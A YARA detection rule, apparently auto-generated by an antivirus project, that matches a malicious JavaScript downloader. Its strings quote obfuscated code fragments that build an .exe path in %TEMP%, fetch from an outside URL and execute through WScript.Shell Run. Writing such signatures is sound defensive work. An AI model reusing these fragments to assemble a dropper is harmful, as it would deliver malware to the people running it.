rule sig_20160328_72c9f034347bba5182770f760f763ad1 {
  meta:
    description = "datamaliciousorder - file 20160328_72c9f034347bba5182770f760f763ad1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0abd090a3d4a431dca70bebc9d5ec06c8b3e646d04310af105b9ec5abb186f91"

  strings:
    $s1  = "function Cfoaxfhg() {return Nvoahtxkcu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"LaJP7o5lqKytH9GL.exe\";};" fullword ascii
    $s2  = "Chprmxnl[Mgsef](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Pchnofpk](Ppochlfxtb() * 11)} while (Chprmxnl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Bbltulxkjr(Xhevh, Epakzo){return Xhevh - Epakzo;};" fullword ascii
    $s5  = "var Nvoahtxkcu = function Lxciqnzrw() {return WScript[Lzzbsfiaa](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Gfpazmm(Xainklec){Nvoahtxkcu[\"Run\"](Xainklec, Qoavkyhsy, Qoavkyhsy);};" fullword ascii
    $s7  = "function Qblhfs() {return ((Vnxuaouiln == true) && (Vnxuaouiln == Yuiygr)) ? 1 : Qoavkyhsy;};" fullword ascii
    $s8  = "var Cipnpikzix = false;" fullword ascii
    $s9  = "function Siepa()" fullword ascii
    $s10 = "Yuiygr = true; " fullword ascii
    $s11 = "return Bbltulxkjr(Fjruad, Tlxogzyyvy);" fullword ascii
    $s12 = " while (Mviyuqshxz){" fullword ascii
    $s13 = "var Anjrvwrl = new this[\"Date\"]();" fullword ascii
    $s14 = "Vnxuaouiln = true; " fullword ascii
    $s15 = "function Wpoturvh(){return Lzzbsfiaa;};" fullword ascii
    $s16 = "var Vnxuaouiln = false;" fullword ascii
    $s17 = "function Arlxxu(){return Izwim;};" fullword ascii
    $s18 = "function Ppochlfxtb(){return 22;};" fullword ascii
    $s19 = "function Bqxehqnv(Krjxmwg) {var Bfdyjjullh = (1, 2, 3, 4, 5, Krjxmwg); return Bfdyjjullh;};" fullword ascii
    $s20 = "var Yuiygr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}